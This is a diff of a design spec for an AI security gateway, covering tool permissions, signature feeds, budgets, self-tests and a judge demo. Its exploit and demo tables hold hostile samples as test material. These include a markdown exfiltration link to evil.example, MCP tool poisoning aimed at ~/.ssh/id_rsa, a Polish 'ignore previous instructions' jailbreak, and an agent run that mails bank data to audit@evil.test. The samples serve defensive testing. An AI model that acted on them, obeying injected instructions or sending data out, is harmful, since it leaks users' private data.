       max_risk: L3
       canary: true                          # C27 appends a canary line to this agent's system prompts
 
@@ -978,6 +994,7 @@ tools:                                      # unlisted tool = invisible + denied
   fs_read_file:     {server: filesystem, labels: [private], risk: L1,
                      validators: {path: {root: /sandbox, deny: ["**/.ssh/**", "**/.env", "**/mcp.json"]}}}
   facts_get_fact:   {server: facts, labels: [untrusted_source], risk: L1}
+  facts_flaky:      {server: facts, labels: [untrusted_source], risk: L1, cost_units: 1}  # S8 / beat 9: always "temporary error, retry"; the 4th identical call trips C05
   vault_admin_get_credentials: {server: vault, honeypot: true, risk: L1}  # C31 decoy: listed, any call kills the run
 
 mcp:
@@ -1108,7 +1125,8 @@ A judge can switch the whole posture by setting `profile: strict`. Any single co
 |---|---|
 | Typo / unknown key | rejected, LKG kept, red banner with the YAML path, `policy_change{result: rejected}` |
 | Malformed YAML, YAML bomb, > 1 MB | rejected, LKG kept |
-| ReDoS or non-RE2 regex | rejected at compile. Python `re` is never used on editable patterns; R7 measured 380-740 ms stalls on it against ~0.2 ms on RE2 |
+| Non-RE2 regex (lookahead `(?=`, lookbehind, backreference) | **rejected at compile**, LKG kept, red banner with the YAML path |
+| Catastrophic-backtracking regex such as `(a+)+$` | **accepted and harmless**: RE2 guarantees linear-time matching, so **"ReDoS can't happen here"**. Python `re` is never used on editable patterns; R7 measured 380-740 ms stalls on such a pattern in Python `re` against ~0.2 ms in RE2. P1 (optional, with rank 13): a lint that flags nested quantifiers as a warning |
 | A rule whose own vectors fail | the whole file is rejected (atomic, predictable) |
 | Valid relaxation (disable a control, `monitor`, lower adherence, relax C24) | **applied in < 2 s** (judges must see it work), plus a posture drop, a `control_weakened` finding, a toast naming the newly uncovered OWASP/ATLAS IDs, and an auto self-test showing GAP or "S4 EXPOSED since v19" |
 | Deleting a section | controls: disabled (red); permissions: **deny** |
@@ -1128,7 +1146,7 @@ A judge can switch the whole posture by setting `profile: strict`. Any single co
 | **tokens** (in/out) | every model | Pre-flight estimate `ceil(chars / 2)` for input (chars/4 undercounts Polish, JSON and PESEL/IBAN by 22-66%, R7 bench). Output reserve = `min(max_tokens or model.max_output, clamp) × n`. Settled from `usage` (`include_usage` is injected) |
 | **micro-USD** (integer) | every model | `sim/*`: price table (labelled **simulated commercial pricing**). Local: `compute_s × usd_per_compute_s` (chargeback). Unknown models: $5 / $25 per Mtok, so nothing is free |
 | **compute-ms** | local models | **P0: wall clock from dispatch to the final chunk** (FACT-CHECK A2: Ollama's `*_duration` fields exist only on the native `/api/chat`, not on the `/v1` path we proxy). Agent lane runs `OLLAMA_NUM_PARALLEL=1` so queueing shows as wait time; this overcount is a documented approximation (residual T15). **P1:** native `/api/chat` with `prompt_eval_duration + eval_duration`; `load_duration` is charged to the platform, not the user |
-| **tool units** | MCP / tool calls | `tools.<name>.cost_units` (default 1), charged on `tools/call` |
+| **tool units** | MCP / tool calls | `tools.<name>.cost_units` (default 1), charged on `tools/call`. **C** owns the `tool_units` ledger unit (in C1's Lua); **D** wires the per-tool `cost_units` metadata at the call site (D3b) |
 | **steps / wall clock / run USD** | runs | C05 counters per `run_id` |
 
 ### 7.2 Hierarchy and resolution
@@ -1223,6 +1241,10 @@ feed:                                  # the signed block (Ed25519 over JCS(feed
 signature: {alg: ed25519, key_id: aicl-feed-2026, sig: "<base64>"}
 ```
 
+**Schema (v1.1, part of `contracts/feed-bundle.schema.json`):**
+- `match` takes the per-type fields listed in §8.4.
+- `metadata.tier` is optional: `P0` (the default), `P1` or `P2`. A gateway that does not yet build a rule's tier, or does not know its type, **skips the rule and lists it**, and never fails on it. So a feed can carry P1/P2 rules ahead of their engines.
+
 ### 8.2 Signing and distribution
 
 - **Signing.** The `feed` service owns the **private key** (generated by `make keys` into a secret mounted only there). `feedctl publish` (`make feed-publish`) is the **explicit publish step**. Signing never happens automatically on file save, so write access to the rules directory is not signing authority (J1 must-fix 12). Publishing:
@@ -1261,11 +1283,22 @@ signature: {alg: ed25519, key_id: aicl-feed-2026, sig: "<base64>"}
 | `semantic` | multilingual MiniLM-L12 kNN (in `guard`) | prompt, tool_output | **P0** | SIG-0010 injection paraphrase exemplars EN+PL, SIG-0019 harm-category exemplars EN+PL (C11) |
 | `url_ioc` | structural URL extraction + host/CIDR/suffix | response, tool_output, tool_args | **P0** | SIG-0002 EchoLeak/CamoLeak class (rewritten from R2's lookahead regex, which RE2 rejects), SIG-0015 mcp-remote OAuth endpoint injection (CVE-2025-6514) |
 | `http_request` | method + path + body predicates on parsed http-tool args | http_request | **P0** | SIG-0005 Ray Jobs (CVE-2023-48022, disputed), SIG-0006 Langflow (CVE-2025-3248), SIG-0007 Ollama `/api/pull` traversal (CVE-2024-37032), SIG-0020 TorchServe ShellTorch (CVE-2023-43654) |
-| `package_ioc` | name + semver | package (MCP launch specs, `pip`/`npx` in tool args) | **P0** | SIG-0013 `postmark-mcp@>=1.0.16`, the 8 bad `nx` versions |
+| `package_ioc` | name + semver | package (MCP launch specs, `pip`/`npx` in tool args) | P1 #17 (v1.1; skipped and listed until then) | SIG-0013 `postmark-mcp@>=1.0.16`, the 8 bad `nx` versions |
 | `hash` | sha256 set | artifact | **P0** | known-bad model files |
 | `pickle_globals` | opcode walk allowlist (C18) | artifact | **P0** | SIG-0004 dangerous GLOBALs, `on_parse_error: block` |
-| `tool_sequence` | run state machine | run | P1 | SIG-0011 toxic flow (C24 already enforces the guarantee; this adds a named detection) |
-| `yara` | YARA-X (BSD-3) | artifact | P2 | SIG-0008 GGUF Jinja SSTI (implemented as a `regex` over the template in P1) |
+| `tool_sequence` | run state machine | run | P2 | SIG-0011 toxic flow (C24 already enforces the guarantee; this adds a named detection) |
+| `yara` | YARA-X (BSD-3) | artifact | P2 | SIG-0008 GGUF Jinja SSTI (shipped as a `regex` rule with `match.field` over the extracted chat template, tier P2) |
+
+**Match fields per type** (v1.1, in `contracts/feed-bundle.schema.json`):
+
+| Type | Fields |
+|---|---|
+| `regex` | `pattern`; optional `field`, a dotted path into a parsed structure such as `gguf.metadata.tokenizer.chat_template` (the default is every view of the text) |
+| `keyword` | `any` + `min_hits`, **or** `topics: {<C11 topic>: [keywords]}` (a grouped pack: only the topics listed in `controls.C11_content_safety.topics` are active) |
+| `semantic` | `model`, `exemplars` **or** `exemplar_groups: {<C11 topic>: [exemplars]}`, `threshold` |
+| `url_ioc` | `extract` (`markdown_image`, `markdown_link`, `html_img`, `html_a`, `autolink`), `host_not_in` (a list or a policy reference such as `policy.output.url_allowlist`), `query_entropy_max_bits`; for URLs in structured fields `url_field`, `deny_scheme_not_in`, `deny_regex` |
+| `http_request` | `method`, `path_regex`, `body_contains`, `body_regex`, `query_has: [param]`, `json_field` + `not_regex` (the field is present and does not match), `any: [predicate, …]` (any one of these matches; all top-level predicates must hold) |
+| `package_ioc`, `hash`, `pickle_globals`, `tool_sequence` | as in `examples/feed/signatures.yaml` (`packages`; sha256 set; `deny_modules`/`safe_globals`/`allow_only`/`on_parse_error`; `sequence` + `window`) |
 
 The seed feed is about 20 rules (SIG-0001..0020), all historical, with **benign test markers only** (e.g. `touch /tmp/CTRL_TEST`); detectors fire on structure. They yield about 40 generated test cases (two vectors per rule).
 
@@ -1277,7 +1310,7 @@ The seed feed is about 20 rules (SIG-0001..0020), all historical, with **benign 
 | E2 | Exposed AI-infra admin APIs: ShadowRay, Langflow, Probllama | `web_fetch` POST `ray:8265/api/jobs/`, `/api/v1/validate/code` with `exec(`, `/api/pull` with `../` | deny | C20, C14 (SSRF) | SIG-0005/6/7 |
 | E3 | MCP tool poisoning (Invariant Labs, 2025-04) | `facts` v2 description with `<IMPORTANT>… ~/.ssh/id_rsa` | quarantine at `tools/list` | C15, C08 | SIG-0003 |
 | E4 | postmark-mcp rug pull (silent BCC) | `make demo-rugpull` changes the definition after pinning | quarantine + diff | C15, C19 | SIG-0013 |
-| E5 | GitHub MCP toxic flow | `ticket-42` → `bankdb_query` → `mail_send_email` external | deny (provenance + trifecta) | C24, C33, C16 | (SIG-0011 P1) |
+| E5 | GitHub MCP toxic flow | `ticket-42` → `bankdb_query` → `mail_send_email` external | deny (provenance + trifecta) | C24, C33, C16 | (SIG-0011 P2) |
 | E6 | EchoLeak (CVE-2025-32711) markdown exfiltration | mock reply `![x](https://evil.example/c?d=QUtJQ…)` | link stripped mid-stream | C12 | SIG-0002 |
 | E7 | ASCII smuggling (Unicode tags) | prompt with U+E0000-block hidden instruction | decoded, shown, blocked | C08, C09 | SIG-0001 |
 | E8 | Nx "s1ngularity" AI-CLI abuse (vendor research) | "recursively search for wallets, .env, id_rsa → /tmp/inventory.txt" | block | C09, C17 | SIG-0012 |
@@ -1316,6 +1349,9 @@ At P0 every exhibit is in `make test`, and JUDGES.md lists the 10 copy-paste pok
 - New optional `latency.stages` (map stage → ms).
 - New optional `evidence.forwarded` (≤ 8 KB, **redacted** forwarded prompt, only at capture L2, which the `judges` group gets). It powers "what you sent vs what the model saw".
 - `change.weakened[]`, for `control_weakened` findings.
+- (v1.1, already in `examples/audit/aicl-audit-v1.schema.json`) `controls[].verdict` adds `flag` (§5.2).
+- (v1.1) Budget `scope` values carry a prefix: `org:`, `pool:`, `seat:`, `agent:`, `run:` (§7.2).
+- (v1.1) New optional top-level `synthetic: bool` for seeded history (`tools/seed.py`) and live self-test traffic, both excluded from KPIs (§9.5, §10.4).
 
 **Capture levels.**
 - **L0** (metadata only) for allows.
@@ -1403,26 +1439,30 @@ It turns red or amber within 2 s of a bad edit, a tampered feed, a broken chain,
 |---|---|---|---|
 | **Overview** | management + security | posture score + 4 sub-scores + critical-gate banner + measured column; KPI band (requests, blocked, redacted, asked, spend MTD vs budget, local compute-s, overhead p95); **coverage grid** (LLM 2026 ×10, ASI ×10, MCP ×10, ATLAS tactic strip) with a cell drill-down; **spend panel** (burn-down for org or a selected group with 75/95/100% lines; local compute-s vs simulated-external µUSD split, with guard models shown as "platform, not charged"; top cost drivers incl. "RUNAWAY LOOP STOPPED (C05)"; race-test tile); **health / fail-mode panel** (§5.4); recent policy changes (applied/rejected) | `/api/header`, `/api/posture`, `/api/coverage`, `/api/kpis`, `/api/spend/summary`, `/api/spend/burndown`, `/api/health`, `/api/policy/history?limit=5` |
 | **Threats** + decision drawer | security | live table (SSE, pause/resume, filters by verdict/severity/surface/control/framework); **drawer tabs:** *Trace* (per-control rows: tier, verdict, score/threshold, rule id + version + origin, matched view, ms), *Run* (the taint chain as an ordered list: each step, its labels, and **where each destination came from**, with provenance class; the S4 money shot), *Evidence* (post-redaction snippet; **decoded hidden text** from tag/b64 views; for judges, **sent vs forwarded** diff), *MCP* (quarantine diff old/new description for pin events), *Integrity* (policy sha, feed serial, chain id/seq/hash ✓); buttons **Export JSONL/CSV**, **Verify chain** | `/api/threats`, `/api/events/{id}`, `/api/events/{id}/related`, `/api/runs/{run_id}`, `/api/mcp/tools/{name}`, `/api/export`, `/api/integrity/verify` |
-| **Controls & Self-test** | security / risk | one row per control: enabled, mode, adherence → `block_at`, fail mode, weight, tests +/−, hits 24 h, p95 ms, health. Read-only at P0; toggles at P1. **Run self-test** button + matrix (controls × cases, 7 states) + exposure line ("S4 EXPOSED since v19"); detectors-off metric; policy history with rejected edits and their YAML path | `/api/controls`, `/api/selftest/runs`, `/api/selftest/matrix`, `/api/policy/history` |
+| **Controls & Self-test** | security / risk | one row per control: enabled, mode, adherence → `block_at`, fail mode, weight, tests +/−, hits 24 h, p95 ms, health. Read-only at P0; toggles at P1. **P0 build (v1.1, F7 1.0 h):** this table with each control's self-test state + a **Run self-test** button + the exposure line ("S4 EXPOSED since v19"). If time allows: the matrix (controls × cases, 7 states), the detectors-off metric, and policy history with rejected edits and their YAML path | `/api/controls`, `/api/selftest/runs`, `/api/selftest/matrix`, `/api/policy/history` |
 | **Playground** (Attack Range) | judges, developers | identity picker (demo principals only: `judge`, `alice`, `ola`), model picker (`ollama/*`, `sim/*`, `mock/scripted`), profile hint, optional system prompt, prompt box, example chips (benign twins + EN/PL attacks: PESEL/IBAN/AWS key, "zignoruj…", base64 + zero-width, Unicode tags, markdown exfil via response override, banned topic, over-budget intern); result: final verdict banner, stage list T0/T1/T2/OUT with ms, **sent vs model-saw** diff, delivered response, response headers incl. `Server-Timing`, "Open trace" | `/api/playground/inspect` |
 
-**P1 pages:** full Spend & budgets (team × model heatmap, forecasts, budget events), Agents & MCP (inventory, quarantine diff + approve re-pin, kill switches, taint graph), Approvals, Policy diff/YAML, Audit query, Exploit Museum cards with Replay. **P2:** My AI, ECS/CEF previews, weekly report.
+**P1 pages:** full Spend & budgets (team × model heatmap, forecasts, budget events), Agents & MCP (inventory, quarantine diff + approve re-pin, kill switches, taint graph, feed panel via `/api/feed`), Approvals, Exploit Museum cards with Replay. **P2:** Policy diff/YAML, Audit query, My AI, ECS/CEF previews, weekly report.
 
 **Cut order if F is behind at IC2:**
 1. The Overview spend panel shrinks to KPI tiles.
-2. Controls shrinks to a read-only table + Run self-test.
+2. The Overview coverage grid drops to a list (framework ID + state pill + required controls). Controls is already a read-only table + Run self-test (v1.1).
 3. Overview drops the measured column.
 4. The drawer's MCP tab merges into Evidence.
 
 **Never cut:** header, Threats + drawer (Trace + Run tabs), Playground.
 
 **Making one UI person productive:**
-- F owns UI only. The read-side endpoints are split across L (SSE, header, Playground), B (threats, events, KPIs, exports) and C (spend), so F never waits on a field.
+- F owns UI only. The read-side endpoints are split across L (SSE, header, Playground), B (threats, events, KPIs, policy history, exports) and C (spend), so F never waits on a field.
 - Fixtures go into `contracts/fixtures/api/*.json` at H1:30, generated by `tools/make_fixtures.py` from the example events, with a canned SSE replay. The mock server from brief §10 serves them.
-- Live endpoints land at H5 (threats + stream), H8 (header, health, replicas) and H10-H12 (the rest).
+- Live endpoints land in four steps:
+  - **H5 (IC1):** the Threats table goes live over SSE from L3's audit tailer.
+  - **H8:** header, health and replicas.
+  - **H8:30:** the DuckDB-backed `/api/threats` filters and `/api/events/{id}` drawer data (B7).
+  - **H10-H13:** the rest.
 - `VITE_API=fixtures|live` switches between the two.
 - SSE falls back to 2 s polling.
-- Seeded history comes from `tools/seed.py`: 7 days, ~20k events, `synthetic: true`, labelled in the UI, so charts are never empty.
+- Seeded history comes from `tools/seed.py` (C8): 7 days, ~20k events, `synthetic: true`, labelled in the UI, so charts are never empty.
 
 ### 9.6 Exports
 
@@ -1475,10 +1515,10 @@ Every export writes an `export` event (format, filter, row count, export sha256)
 |---|---|---|
 | **Per-control cases** | ≥ 1 POS + ≥ 2 NEG for every P0 control (~90). One NEG is always a false-positive guard: security-education prompts, Polish diacritics, a failing checksum (`44051401358`), an allowlisted image host, `SELECT … LIMIT 5` | meta-test |
 | **Feed vectors** | every rule's embedded positive/negative vectors (~40) | feed acceptance |
-| **Obfuscation matrix** (P0 subset) | every NEG case with `mutate: true` × {base64, zero-width split, Unicode tags, homoglyph, leetspeak, letter spacing, **pre-translated Polish** (fixed human-written strings), split across stream chunks (output cases)}. Deterministic controls must be **100% invariant**; semantic cases report rates (stub guard) | IC4 |
+| **Obfuscation matrix** (v1.1: the mutators are P1 #8; at P0, hand-written obfuscated NEG cases cover base64, zero-width, Unicode tags and Polish) | every NEG case with `mutate: true` × {base64, zero-width split, Unicode tags, homoglyph, leetspeak, letter spacing, **pre-translated Polish** (fixed human-written strings), split across stream chunks (output cases)}. Deterministic controls must be **100% invariant**; semantic cases report rates (stub guard) | IC4 (hand-written cases); P1 (mutators) |
 | **Invariants: detectors off** | `policies/test-detectors-off.yaml` (C09, C10, C11, C16 disabled; C08 still decodes): **S4 and S5 exfiltration still denied** by C24/C33 (+ C14 email). Also: a forged, absent or rotated run token stays in the tainted fallback run; a paraphrased destination ("audit at evil dot test") is never trusted; a homoglyph `bаnk.example` is denied with a critical alert | **H12 gate** |
-| **Fence & admin isolation** | `fence-probe` from the agent container: valkey, control, guard, mcp-*, mock, `host.docker.internal:11434` and the internet are unreachable; `lb /admin/*` and `/api/*` return 404 | IC1 (probe), **H12 gate** (test) |
-| **Hot reload & tamper** | verdict flips in < 2 s on 2/2 replicas (propagation time recorded); typo key, YAML bomb, ReDoS regex and failing rule vector are each rejected with LKG kept; a relaxation emits `control_weakened`; deleting `models:` denies everything | IC2 |
+| **Fence & admin isolation** | `fence-probe` from the agent container: valkey, control, guard, mcp-*, mock, host Ollama (`host.docker.internal:11434` **and the raw host IP**) and the internet are unreachable, plus `model-runner.docker.internal` if Docker Model Runner is enabled; `lb /admin/*` and `/api/*` return 404 | IC1 (probe), **H12 gate** (test) |
+| **Hot reload & tamper** | verdict flips in < 2 s on 2/2 replicas (propagation time recorded); typo key, YAML bomb, non-RE2 regex (lookaround / backreference) and failing rule vector are each rejected with LKG kept; a catastrophic-backtracking regex (`(a+)+$`) is **accepted** and scans a long `aaaa…!` prompt (under the 32k-char cap) in linear time; a relaxation emits `control_weakened`; deleting `models:` denies everything | IC2 |
 | **Feed** | publish applies in < 5 s; tampered bundle, rolled-back serial and **serial replay after a gateway restart** are each rejected; expired → stale; unknown rule type skipped and listed | IC4 |
 | **Budget** | pre-flight 429 with **zero upstream calls**; `max_tokens ≤ 0` → 400; `n=50` clamped; Ollama options stripped; warn thresholds; **cross-replica race 200 → exactly 50**; loop breaker on the 4th identical call; ledger down → external 503 / local capped | IC2; race at the **H12 gate** |
 | **Exploit Museum** | E1-E10 fixtures generated at session start (malicious and truncated pickles are scanned, never loaded) | IC4 |
@@ -1540,8 +1580,8 @@ cases:
 **Fields:**
 - `id`, `title`, `control` (`Cxx` or `Cxx.rule`), `surface`, `polarity`, `attack`, `principal`, `agent`, `model`, `run`;
 - input: `input` (string or `messages`) **or** `steps`, plus `mock` (a `[[mock:…]]` directive);
-- `expect`: `verdict`, `http_status`, `finish_reason`, `rule_id`, `primary_control`, `upstream_called`, `upstream_body_not_contains`, `output_contains`, `output_not_contains`, `mcp_is_error`, `flags`, `audit`, `max_latency_ms`;
-- `by_profile`, `mutate` (true or a list of mutators), `invariant`, `canary`, `museum`, `tags` (`owasp_llm`, `owasp_asi`, `owasp_mcp`, `atlas`, `aitg`, `lang`).
+- `expect`: `verdict`, `http_status`, `finish_reason`, `rule_id`, `primary_control`, `upstream_called`, `upstream_body_not_contains`, `output_contains`, `output_not_contains`, `mcp_is_error`, `flags`, `audit`, `max_latency_ms`, `headers` (v1.1: `{name: value}` response-header assertions, e.g. `{x-should-retry: "false", x-aicl-decision: "block; control=C03"}`);
+- `by_profile` (the field name, as in `examples/tests/c07_pii.yaml`; never `by_strictness`), `mutate` (true or a list of mutators; executed from P1 #8), `invariant`, `canary`, `museum`, `tags` (`owasp_llm`, `owasp_asi`, `owasp_mcp`, `atlas`, `aitg`, `lang`).
 
 Values like `{{ faker.pl.pesel }}` and `{{ secret("aws") }}` are generated at runtime, so no realistic secret is ever committed (GitHub push protection, R8).
 
@@ -1606,7 +1646,8 @@ Values like `{{ faker.pl.pesel }}` and `{{ secret("aws") }}` are generated at ru
 | `C10_injection.enabled: false` | the paraphrased injection now passes; **S4 still blocked** | LLM01 cell amber/red, posture ▼, GAP | < 2 s |
 | `C24_taint.untrusted_destination: monitor` | **"S4 EXPOSED since v19"**; `control_weakened` (critical) | self-test, Threats, header posture capped at 70 | < 3 s |
 | `profile: strict` | emails blocked, adherence 99, `stream_mode: buffer`, unknown destinations denied | Controls page, posture | < 2 s |
-| typo key `enabeld:` / YAML bomb / `(a+)+$` regex | rejected, LKG kept | red header with the YAML path, history row REJECTED | < 2 s |
+| typo key `enabeld:` / YAML bomb / non-RE2 regex such as `(?=x)` or `(a)\1` | rejected, LKG kept | red header with the YAML path, history row REJECTED | < 2 s |
+| add a `(a+)+$` rule and send a long `aaaa…!` prompt (under the 32k-char cap) | **accepted**; the match runs in linear time ("ReDoS can't happen here": RE2 ~0.2 ms vs 380-740 ms in Python `re`, R7) | header v↑, `Server-Timing` t1 in ms | < 2 s |
 | delete the `models:` section | every model call → 400 (permissions opt-in) | Threats, toast | < 2 s |
 | `groups.interns` seat `daily_tokens: 50` | ola's next request → 429 with reset time | Spend, `/v1/me` | next request |
 | `identities.agents.support-bot.enabled: false` | 403 on every edge | Threats, header | < 2 s |
@@ -1624,7 +1665,7 @@ Values like `{{ faker.pl.pesel }}` and `{{ secret("aws") }}` are generated at ru
 ### 11.1 Conventions
 
 - **Base:** `http://127.0.0.1:3000/api` (the `control` service on the `admin` network). The SPA is served from `/`.
-- **Auth:** `Authorization: Bearer <AICL_ADMIN_TOKEN>` on every route (generated by `make keys`). The console asks for it once and keeps it in `sessionStorage`. The role switch (Security/Management/Developer) is **UI-only at P0**; server-side field stripping is P1.
+- **Auth:** `Authorization: Bearer <AICL_ADMIN_TOKEN>` on every route (generated by `make keys`). The console asks for it once and keeps it in `sessionStorage`. The role switch (Security/Management/Developer) is **UI-only at P0**; server-side field stripping is P2.
 - **Isolation:** the data plane exposes **no** `/api` or `/admin` routes (C35, tested).
 - **JSON conventions:** ISO-8601 UTC; **money in integer micro-USD**; IDs as strings. Lists are cursor-paged as `{items, next_cursor}`. Errors are `{error: {type, message, hint?}}` with 400/401/403/404/409/422/429/503. Every write produces an audit event in `control`'s chain and returns its `seq`.
 - **Response shapes:** the shapes in `docs/dashboard-design-brief.md` §5 are adopted where an endpoint below says "brief §5.x". The deltas are listed in §11.6.
@@ -1660,8 +1701,8 @@ Values like `{{ faker.pl.pesel }}` and `{{ secret("aws") }}` are generated at ru
 | `GET /api/mcp/tools` · `GET /api/mcp/tools/{name}` | **P0 (read)** | D | brief §5.5 (pin, status, old/new description, findings) |
 | `GET /api/spend/summary?period=` · `GET /api/spend/burndown?scope=&period=` | **P0** | C | below · brief §5.2 |
 | `GET /api/controls` | **P0** | L | brief §5.4 + `adherence`, `block_at`, `fail`, `origin_counts` |
-| `GET /api/policy/history?limit=` | **P0** | L | brief §5.4 (+ `replicas_applied`, `unsigned_local_change`) |
-| `GET /api/feed` | **P0** | B | brief §5.5 + `local_rules_active`, `last_reject` |
+| `GET /api/policy/history?limit=` | **P0** | B (v1.1, from L6; L supplies the derived diff and posture delta) | brief §5.4 (+ `replicas_applied`, `unsigned_local_change`) |
+| `GET /api/feed` | P1 #6 (v1.1: no P0 page reads it; the header carries the feed state) | B | brief §5.5 + `local_rules_active`, `last_reject` |
 | `POST /api/selftest/runs {suite: canary\|full}` · `GET /api/selftest/runs` · `GET /api/selftest/runs/{id}` · `GET /api/selftest/matrix` | **P0** | L | brief §5.7 (states per §10.4) + `exposed[]` |
 | `GET /api/integrity` · `POST /api/integrity/verify` | **P0** | B | brief §5.8 + `checkpoints: {last_seq, last_signed_at, key_id}` per chain; verify returns `first_bad_seq`, `reason: content_modified \| checkpoint_mismatch \| truncated \| missing_chain` |
 | `GET /api/export?format=jsonl\|csv&from&to&q` | **P0** | B | stream + `export` audit event; `ocsf` at P1 |
@@ -1670,7 +1711,7 @@ Values like `{{ faker.pl.pesel }}` and `{{ secret("aws") }}` are generated at ru
 | `PATCH /api/controls/{id}` (`If-Match: <sha>`) · `PATCH /api/agents/{id}` | P1 | L | brief §5.4: 202 + result via SSE; 409 on sha mismatch; same validator + atomic rename |
 | `POST /api/mcp/tools/{name}/decision {action: repin\|keep_blocked}` | P1 | D | brief §5.5 |
 | `GET /api/approvals` · `POST /api/approvals/{id}/decision` | P1 | D | brief §5.6 (single approver ≠ requester; four-eyes P2) |
-| `GET /api/policy/versions/{v}` · `GET /api/policy/diff?from&to` | P1 | L | brief §5.4 |
+| `GET /api/policy/versions/{v}` · `GET /api/policy/diff?from&to` | P2 (with the Policy diff page) | L | brief §5.4 |
 | `GET /api/selftest/mutation` · `GET /api/selftest/efficacy` | P1 | L/C | brief §5.7 |
 | `POST /api/scenarios/{id}/replay` (Exploit Museum, S1-S8 via the scripted-agent library through the data plane) | P1 | L | `{run_id, events[]}` |
 | `GET /api/me`, `POST /api/whatif`, `GET /api/risky`, `GET /api/reports/weekly` | P2 | — | brief §5 |
@@ -1760,19 +1801,19 @@ The rules from brief §5.12 apply:
 ### 11.5 Mocks from hour 1 (the UI person's path)
 
 1. **H1:30:** L commits `contracts/fixtures/api/*.json` (generated from the example events) and `contracts/fixtures/stream.jsonl`. F runs `ui/mock_server.py` (brief §10) on port 8000.
-2. **H5:** `control` serves `/api/stream` live, so Threats rows arrive over SSE. `/api/threats` and `/api/events/{id}` follow at H8:30 (B7). F flips `VITE_API=live` per page as endpoints land.
+2. **H5 (IC1):** `control` serves `/api/stream` live from L3's audit tailer, so the Threats table is live over SSE. The DuckDB-backed filters and drawer data (`/api/threats`, `/api/events/{id}`) follow at H8:30 (B7). F flips `VITE_API=live` per page as endpoints land.
 3. **H8:** `/api/header`, `/api/replicas`, `/api/health` and `/api/playground/inspect` are live.
 4. **H12:** every P0 endpoint is live. A fixture-vs-live contract test (`tests/integration/test_api_contract.py`) validates live responses against the fixture JSON schemas.
 
 ### 11.6 Where this spec overrides `docs/dashboard-design-brief.md`
 
 1. The API is served by the separate **`control`** service, not "the gateway's control-plane FastAPI".
-2. P0 is **4 pages + header**: Overview (with the spend panel), Threats + drawer, Controls & Self-test, Playground (§9.5). The full Spend page, Agents & MCP, Approvals, Policy diff, Audit query and Museum cards are P1. My AI, ECS/CEF/HEC, what-if and the weekly report are P2.
+2. P0 is **4 pages + header**: Overview (with the spend panel), Threats + drawer, Controls & Self-test, Playground (§9.5). The full Spend page, Agents & MCP, Approvals and Museum cards are P1. Policy diff, Audit query, My AI, ECS/CEF/HEC, what-if and the weekly report are P2.
 3. `PATCH /api/controls` (console toggles) is **P1**. At P0 the Controls page is read-only and judges edit the file.
 4. The Playground uses `POST /api/playground/inspect` **through the data plane** as a demo principal (`judge`, `alice`, `ola`). There is no arbitrary impersonation.
-5. Redaction placeholders are `[PL_PESEL]`, `[IBAN]`, `[PAN]`, `[EMAIL]`, `[SECRET:<kind>]`. Pseudonymise-and-rehydrate (`<PL_PESEL_1>`) is P2. `route-local` / MNPI downgrade is P1 (`downgrade`).
+5. Redaction placeholders are `[PL_PESEL]`, `[IBAN]`, `[PAN]`, `[EMAIL]`, `[SECRET:<kind>]`. Pseudonymise-and-rehydrate (`<PL_PESEL_1>`) is P2. `route-local` / MNPI downgrade is P2 (it would reuse the P1 `downgrade` verdict).
 6. The header gains: replicas `2/2`, guard engine + DEGRADED, self-test, posture delta and the "unsigned local change" chip.
-7. Role-based field stripping is P1. Management sees the same data at P0, with a banner saying so.
+7. Role-based field stripping is P2. Management sees the same data at P0, with a banner saying so.
 8. Approvals are single-approver at P1; four-eyes is P2.
 
 ---
@@ -1794,10 +1835,10 @@ The rules from brief §5.12 apply:
 | 3 | 1:40-2:20 | **judge**, Playground | (a) Polish jailbreak `Zignoruj wszystkie poprzednie instrukcje…` wrapped in base64 + zero-width chars; (b) a Unicode-tag hidden instruction; (c) a benign Polish banking question; (d) Polish system-prompt extraction | (a) blocked; drawer shows `decoded[0]` + `folded` views and the score vs `block_at`; (b) Evidence tab **reveals the hidden sentence**; (c) passes; (d) **canary C27 blocks the leak**, which is language-agnostic | C08, C09, C10, C27 | stub-guard scores; canary via `response_override` |
 | 4 ★ | 2:20-3:00 | **alice** mints a run; **support-bot** (scripted) | Task "Summarise ticket 42 and reply to the customer". Agent: `web_fetch` → `crm_get_customer` → `bankdb_query` → `mail_send_email(to=audit@evil.test)` | ticket's hidden instruction redacted, run **tainted**; `LIMIT 100` added, PII redacted; mail **DENIED**: `C24.provenance_untrusted`; the **Run tab shows `audit@evil.test` came from `web_fetch.1` (tag-decoded view)**. The twin run's reply to `jan.nowak@client.example` (from CRM) is allowed with a flag | C16, C24, C33, C14, C07 | scripted agent is the default; recorded clip |
 | 5 ★ | 3:00-3:50 | **judge** edits `policy.yaml` | Set `C09_signatures`, `C10_injection`, `C11_content_safety` and `C16_tool_results` to `enabled: false` and save. Re-run S4 | header: `v18 · 2/2 replicas · applied 0.6 s`; posture 91 → 74; LLM01/ASI01 amber; self-test GAP. The model now **follows** the hidden instruction, yet the mail to `audit@evil.test` is **still denied** (`dest_class: untrusted`). **"Detectors are evidence. Authority is the guarantee."** | C30, C24, C33 (H12 gate) | `make test` invariant line: "detectors-off 12/12 still blocked" |
-| 6 | 3:50-4:20 | **judge** | Set `C24_taint.untrusted_destination: monitor`. Then revert. Then add a typo key `enabeld:` and a `(a+)+$` regex | `control_weakened` (critical); posture capped at 70; self-test **"S4 EXPOSED since v19"**; revert → green. Typo and ReDoS → **rejected, LKG kept**, red header with the YAML path | C30, C32, C24 | edits are integration tests |
+| 6 | 3:50-4:20 | **judge** | Set `C24_taint.untrusted_destination: monitor`. Then revert. Then add a typo key `enabeld:` and a lookahead regex `(?=…)`. Then add `(a+)+$` and send a long `aaaa…!` prompt | `control_weakened` (critical); posture capped at 70; self-test **"S4 EXPOSED since v19"**; revert → green. Typo and lookahead → **rejected, LKG kept**, red header with the YAML path. `(a+)+$` → **accepted** and harmless: the request returns in milliseconds. **"ReDoS can't happen here"** (RE2 is linear-time) | C30, C32, C24 | edits are integration tests |
 | 7 | 4:20-4:50 | **support-bot** | `tools/list` (poisoned `facts`) → `make demo-rugpull` → agent calls `vault_admin_get_credentials` | `facts_get_fact` quarantined (E001 instruction block + cross-server reference to `mail_send_email`); after the rug pull a **diff** in the drawer MCP tab; honeypot → **run killed, agent quarantined**, 403 on every edge | C15, C31, C26 | scripted agent |
